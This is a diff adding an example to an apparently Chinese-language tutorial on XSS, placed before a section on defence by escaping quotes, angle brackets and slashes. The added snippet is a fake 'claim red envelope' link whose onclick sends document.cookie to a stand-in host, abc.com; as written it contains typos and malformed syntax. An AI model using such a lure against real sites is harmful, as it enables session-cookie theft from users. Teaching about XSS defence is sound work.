@@ -30,6 +30,14 @@ Don't get confused by the differences between `Node.textContent` and [`HTMLEleme
 
 
 
+例子🌰
+
+```html
+<a href="#" onclick=`window.location=http://abc.comcookie=${docuemnt.cookie}`>领取红包</a>
+```
+
+
+
 ## 如何防御？
 
 转义输入输出的内容，对于引号，尖括号，斜杠进行转义
